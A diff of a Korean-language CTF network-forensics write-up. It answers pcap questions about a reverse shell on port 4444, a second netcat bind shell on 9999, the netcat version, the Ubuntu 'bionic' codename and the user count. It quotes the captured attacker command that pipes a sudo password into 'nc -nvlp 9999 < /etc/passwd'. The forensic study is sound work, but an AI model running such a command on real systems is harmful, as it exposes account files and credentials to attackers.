@@ -56,25 +56,42 @@
 	  	-> OneSuperDuperSecret
 
   ### Q10. What port is the shell listening on? (shell.pcanpng)
-      1. 
+      1. 일단 문제의 의도부터 해석하기 위해 검색해보니 "특정 네트워크 포트를 열어두고 외부의 연결 신호를 기다리고 있는 상태"로 확인
+	  2. 여기에는 Bind shell(피해자가 포트 열리고 공격자가 침투)와 Reverse shell(공격자가 포트 열고 피해자가 들어옴)는 두개로 구분되어 진다.
+	  3. wireshark에서 통계로 IP간의 통신 횟수를 분석하니 192.168.2.5(52242)와 192.168.2.244(4444)두개의 IP가 압도적으로 많아 의심
+	  4. listening on port이니 대기중이다 syn받은 port가 정답
+	  	-> 4444(처음 SYN을 보낸게 4444가 아니다보니 reverse shell로 추정)
         
   ### Q11. What is the port for the second shell? (shell.pcanpng)
-      1. 
+      1. 10번 패킷을 tcp 따라가기로 전체 내용 분석하면 도중에 이상한점을 발견함
+	  2. echo "*umR@Q%4V&RC" | sudo -S nc -nvlp 9999 < /etc/passwd 이 내용이 공격자가 피해자에게 보내고 피해자가 실행하는 것을 알 수 있음
+	  3. netcat에서 -l(listenin 모드) -p [~](포트설정)으로 9999포트를 listen으로 피해자의 만든 것을 확인할 수 있음(bind shell하려는 목적으로 추측)
+	  	-> 9999
 
   ### Q12. What version of netcat is installed? (shell.pcanpng)
-      1. 
+      1. tcp 따라가기로 분석하다보면 The following NEW packages will be installed: netcat을 찾아 netcat을 피해자 컴퓨터에 설치하려는 모습이 보임
+	  	-> 1.10-41.1
 	  
   ### Q13. What file is added to the second shell? (shell.pcanpng)
-      1. 
+      1. echo "*umR@Q%4V&RC" | sudo -S nc -nvlp 9999 < /etc/passwd이 명령어가 shell에서 실행되는 것을 보임
+	  	 # ehco "*umR@Q%4V&RC" | : 피해자 비번 입력(sudo 사용을 위해), < /etc/passwd : 포트 연결시 이 파일 입력으로 넣음
+		-> /etc/passwd 
 
   ### Q14. What password is used to elevate the shell? (shell.pcanpng)
-      1. 
+      1. shell 권한 올리는 비밀번호도 13번 문제에서 확인 가능
+	  	-> *umR@Q%4V&RC
 
   ### Q15. What is the codename of the target system's OS version? (shell.pcanpng)
-      1. 
+      1. 처음에는 OS에 우분투가 해당되는지 까먹고 계속 찾다가 깨달음
+	  2. 내용을 보다보면 http://us.archive.ubuntu.com/ubuntu bionic/universe amd64 netcat all 1.10-41.1 [3,436 B] 확인함
+	  3. ubuntu bionic을 분석하니 ubuntu의 버전 이름인 것을 확인
+	  	-> bionic
 	  
   ### Q16. How many users are on the target system? (shell.pcanpng)
-      1. 
+      1. target system 즉 아까 공격자가 14번 문제에서 꺼내가려는 파일을 확인하면 될 것으로 추측
+	  2. 해당  "Connection from 192.168.2.244 34972 received!"의 바로 다음 패킷의 len 길이(즉 내용 데이터의 크기)가 매우 큰 것을 확인
+	  3. 해당 데이터를 추출 후 분석해보니 "qqroot:x:0:0:root:/root:/bin/bash" 같은 형식으로 여러개 있음(etc/passwd의 계정 목록)
+	  	-> 31
 
   ### Q17. What is the IPv6 NTP server IP? (network.pcanpng)
       1. 
